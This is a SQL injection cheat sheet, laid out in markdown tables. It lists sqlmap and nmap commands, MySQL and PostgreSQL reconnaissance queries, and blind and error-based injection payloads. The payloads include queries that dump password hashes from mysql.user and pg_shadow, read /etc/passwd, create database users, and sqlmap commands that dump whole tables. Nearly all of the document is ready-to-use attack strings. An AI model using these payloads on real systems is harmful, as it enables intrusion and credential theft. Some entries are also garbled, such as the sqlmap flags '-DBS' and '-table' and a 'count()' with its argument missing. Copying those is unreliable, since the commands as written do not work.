# SQL Injection Cheat Sheet

## Automated Tools

### SQLMAP

| Command                                                        | Description                           |
| -------------------------------------------------------------- | ------------------------------------- |
| `sqlmap -u "url" --forms --batch --crawl=10 --level=5 --risk=3`  | Automated SQL Injection scan with form handling |
| `nmap -p80 --script=http-sql-injection --script-args=http-spider.maxpagecount=200 <target>` | Using Nmap to detect SQL Injection vulnerability |

### MySQL

| Query                                                         | Description                           |
| ------------------------------------------------------------- | ------------------------------------- |
| `SELECT @@version;`                                            | Get MySQL version                     |
| `SELECT user();`                                               | Get current MySQL user                |
| `SELECT system_user();`                                         | Get system user                       |
| `SELECT user FROM mysql.user;`                                  | List users                            |
| `SELECT host, user, password FROM mysql.user;`                  | List password hashes                 |
| `SELECT database();`                                            | Get current database                  |
| `SELECT schema_name FROM information_schema.schemata;`          | List databases                        |
| `SELECT DISTINCT(db) FROM mysql.db;`                           | List databases (alternative)          |
| `SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';` | List tables (exclude system databases) |
| `SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema';` | List columns in all tables            |
| `SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';` | Find tables with 'username' column    |
| `SELECT BENCHMARK(1000000,MD5('A'));`                           | Time delay for SQL injection testing  |
| `SELECT SLEEP(5);`                                              | Time delay function                   |
| `... UNION ALL SELECT LOAD_FILE('/etc/passwd') --`               | Local file access (UNIX)              |
| `SELECT @@hostname;`                                            | Get hostname/IP address               |
| `CREATE USER test1 IDENTIFIED BY 'pass1'; --`                   | Create a new MySQL user               |
| `DROP USER test1; --`                                           | Delete a MySQL user                   |
| `SELECT @@datadir;`                                             | Location of MySQL data directory      |

### SQLMAP Commands for Database Interaction

| Command                                                            | Description                           |
| ------------------------------------------------------------------ | ------------------------------------- |
| `sqlmap -u "url" -DBS`                                              | List available databases              |
| `sqlmap -u "url" -table -D [database]`                              | List tables in the specified database |
| `sqlmap -u "url" -columns -D [database] -T [table]`                 | List columns in the specified table   |
| `sqlmap -u "url" -dump -D [database] -T [table]`                    | Dump data from the specified table    |

### Manual Attack Techniques

| Command                                                             | Description                           |
| ------------------------------------------------------------------- | ------------------------------------- |
| `select 1 and row(1,1)>(select count(),concat(CONCAT(@@VERSION),0x3a,floor(rand(2)))x from (select 1 union select 2)a group by x limit 1)` | Quick detection for integers         |
| `'+(select 1 and row(1,1)>(select count(),concat(CONCAT(@@VERSION),0x3a,floor(rand(2)))x from (select 1 union select 2)a group by x limit 1))+` | Quick detection for strings          |

### Clear SQL Test Cases

| URL Example                                 | Description                           |
| ------------------------------------------- | ------------------------------------- |
| `product.php?id=4`                          | Simple test for SQL injection         |
| `product.php?id=5-1`                        | Subtracting to test error-based injection |
| `product.php?id=4 OR 1=1`                   | Basic OR-based SQL injection          |
| `product.php?id=-1 OR 17-7=10`              | Another example of OR-based injection |

### Blind SQL Injection (Time Delay)

| Query                                                          | Description                           |
| -------------------------------------------------------------- | ------------------------------------- |
| `SLEEP(25)--`                                                  | Basic time delay injection            |
| `SELECT BENCHMARK(1000000, MD5('A'));`                          | Another example of time delay injection |

### Real-World Sample

| Query                                                                                       | Description                           |
| ------------------------------------------------------------------------------------------- | ------------------------------------- |
| `ProductID=1 OR SLEEP(25)=0 LIMIT 1--`                                                       | Example of time-based SQL injection   |
| `ProductID=1') OR SLEEP(25)=0 LIMIT 1--`                                                     | Example with single quote             |
| `ProductID=1' OR SLEEP(25)=0 LIMIT 1--`                                                      | Another variation with single quote  |
| `ProductID=1)) OR SLEEP(25)=0 LIMIT 1--`                                                     | Another blind SQL injection           |
| `ProductID=SELECT SLEEP(25)--`                                                              | Blind injection with SELECT           |

### PostgreSQL

| Query                                                           | Description                           |
| --------------------------------------------------------------- | ------------------------------------- |
| `SELECT version();`                                              | Get PostgreSQL version                |
| `--comment | / comment /`                                        | Comments in PostgreSQL                |
| `SELECT user;`                                                   | Get current user                      |
| `SELECT current_user;`                                           | Get current user (alternative)        |
| `SELECT session_user;`                                           | Get session user                      |
| `SELECT usename FROM pg_user;`                                    | List PostgreSQL users                 |
| `SELECT usename FROM pg_user WHERE usesuper IS TRUE;`             | List DBA accounts (superuser)         |
| `SELECT usename, passwd FROM pg_shadow;`                          | List password hashes                 |
| `SELECT current_database();`                                      | Get current database                  |
| `SELECT datname FROM pg_database;`                                | List databases                        |
| `SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid);` | List tables                          |
| `SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public');` | List columns                         |
| `SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '%password%';` | Find tables with 'password' column   |
| `SELECT pg_sleep(10);`                                           | Time delay function (PostgreSQL)      |
| `CREATE TABLE mydata(t text); COPY mydata FROM '/etc/passwd';`   | Local file access (UNIX)              |
| `SELECT inet_server_addr();`                                      | Get hostname/IP address               |
| `SELECT inet_server_port();`                                      | Get port number                       |
| `CREATE USER test1 PASSWORD 'pass1'; CREATEUSER`                  | Create a new PostgreSQL user          |
| `DROP USER test1;`                                                | Delete a PostgreSQL user              |
| `SELECT current_setting('data_directory');`                       | Location of PostgreSQL data directory |
